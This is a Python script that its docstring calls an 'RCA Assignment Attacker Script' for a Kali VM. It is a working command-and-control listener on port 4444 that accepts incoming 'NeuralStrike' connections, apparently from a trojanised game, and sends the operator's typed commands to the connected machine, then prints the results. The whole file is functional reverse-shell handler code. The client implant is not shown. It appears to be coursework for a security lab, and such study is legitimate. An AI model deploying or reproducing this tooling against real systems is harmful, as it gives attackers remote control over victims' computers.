import socket
import sys

def start_master_console(port=4444):
    """
    RCA Assignment Attacker Script (Master Console).
    Run this on your Kali VM: python3 attacker.py
    """
    print(f"[*] Starting RCA Master Console on port {port}...")
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(("0.0.0.0", port))
        server.listen(5)
        print("[*] Listening for incoming NeuralStrike connections...")
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

    while True:
        client, addr = server.accept()
        print(f"\n[+] CONNECTION ESTABLISHED: {addr[0]}")
        
        try:
            # Read banner
            banner = client.recv(1024).decode()
            print(banner)
            
            while True:
                # Read prompt from game
                prompt = client.recv(1024).decode()
                command = input(prompt)
                
                if command.strip().lower() == "exit":
                    client.send(b"exit")
                    break
                
                if not command.strip():
                    client.send(b" ")
                    continue
                    
                client.send(command.encode())
                
                # Receive output
                response = client.recv(4096).decode()
                print(response)
        except Exception as e:
            print(f"\n[-] Connection Lost: {e}")
        finally:
            client.close()
            print("[*] Returning to listening mode...")

if __name__ == "__main__":
    start_master_console()
